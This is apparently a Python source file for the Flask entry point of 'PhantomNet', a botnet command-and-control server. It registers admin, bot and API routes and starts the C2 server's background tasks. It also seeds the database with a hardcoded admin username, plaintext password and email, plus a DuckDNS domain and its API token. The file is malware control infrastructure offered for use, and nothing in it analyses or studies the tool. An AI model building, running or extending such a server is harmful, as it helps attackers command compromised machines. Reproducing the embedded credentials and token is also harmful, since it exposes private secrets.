"""
Main Flask application for PhantomNet C2 Server
"""

import logging
from flask import Flask

from .config import config
from .models import db
from .server import PhantomC2Server
from .routes.admin import admin_bp
from .routes.bot import bot_bp
from .routes.api import api_bp

logger = logging.getLogger(__name__)

def create_app(config_name=None):
    """Application factory pattern"""
    app = Flask(__name__)

    # Load configuration
    config_name = config_name or 'default'
    config_class = config.get(config_name, config['default'])
    app.config.from_object(config_class)

    # Initialize extensions
    db.init_app(app)

    # Register blueprints
    app.register_blueprint(admin_bp)
    app.register_blueprint(bot_bp)
    app.register_blueprint(api_bp)

    # Configure logging
    logging.basicConfig(
        level=getattr(logging, app.config['LOG_LEVEL'].upper(), logging.INFO),
        format=app.config['LOG_FORMAT'],
        handlers=[
            logging.FileHandler(app.config['LOG_FILE']),
            logging.StreamHandler()
        ]
    )

    # Create database tables and initialize default data
    with app.app_context():
        db.create_all()
        _initialize_default_data()

    # Initialize server instance
    server = PhantomC2Server(
        host=app.config['HOST'],
        port=app.config['PORT']
    )

    # Store server instance in app context for global access
    app.server = server

    # Start background tasks (runs in separate thread), pass app for context
    server.start_background_tasks(app)

    return app

def _initialize_default_data():
    """Initialize default data in database"""
    from .models import Admin, DuckDNSUpdater
    from werkzeug.security import generate_password_hash

    # Check if admin user already exists to avoid duplicates
    if not Admin.query.filter_by(username='wappafloppa').first():
        admin = Admin(
            username='wappafloppa',
            password_hash=generate_password_hash('Stelz17'),
            email='mrfkry93@gmail.com'
        )
        db.session.add(admin)
        db.session.commit()
        logger.info("Default admin user created.")
    else:
        logger.info("Default admin user already exists, skipping creation.")

    # Initialize DuckDNS configuration if missing
    if not DuckDNSUpdater.query.first():
        duckdns = DuckDNSUpdater(
            domain='web-swervo.duckdns.org',
            token='d6d0b3fa-a957-47c5-ba7f-f17e668990cb',
            is_active=False
        )
        db.session.add(duckdns)
        db.session.commit()
        logger.info("Default DuckDNS configuration created.")
    else:
        logger.info("DuckDNS configuration already exists, skipping creation.")

# Create default app instance
app = create_app()

if __name__ == '__main__':
    app.run(
        host=app.config['HOST'],
        port=app.config['PORT'],
        ssl_context=app.config['SSL_CONTEXT'],
        threaded=True,
        debug=app.config['DEBUG']
    )
